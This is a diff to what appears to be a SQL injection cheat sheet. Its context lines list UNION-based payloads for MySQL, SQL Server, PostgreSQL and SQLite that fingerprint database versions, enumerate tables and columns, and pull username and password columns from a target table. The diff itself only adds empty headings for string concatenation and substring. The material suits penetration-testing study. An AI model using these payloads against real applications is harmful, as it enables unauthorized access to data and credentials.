@@ -17,6 +17,13 @@
 ● PostgreSQL                    : ' UNION SELECT version(), NULL-- 
 ● SQLite                        : ' UNION SELECT sqlite_version(), NULL-- 
 ```
+#### String Concantenation
+```
+● MySQL / Microsoft SQL Server  : 
+● Oracle                        : 
+● PostgreSQL                    : 
+● SQLite                        : 
+```
 #### Database Contents
 ```
 ● MySQL / Microsoft SQL Server  : ' UNION SELECT table_name FROM information_schema.tables-- (if column count more than one put NULL after table_name)
@@ -33,6 +40,10 @@
                                   ' UNION SELECT name FROM pragma_table_info('put_table_name_here')--
                                   ' UNION SELECT put_username_here, put_password_here FROM put_table_name_here--
 ```
-####
-
-
+#### Substring
+```
+● MySQL / Microsoft SQL Server  :
+● Oracle                        :
+● PostgreSQL                    : 
+● SQLite                        :
+```
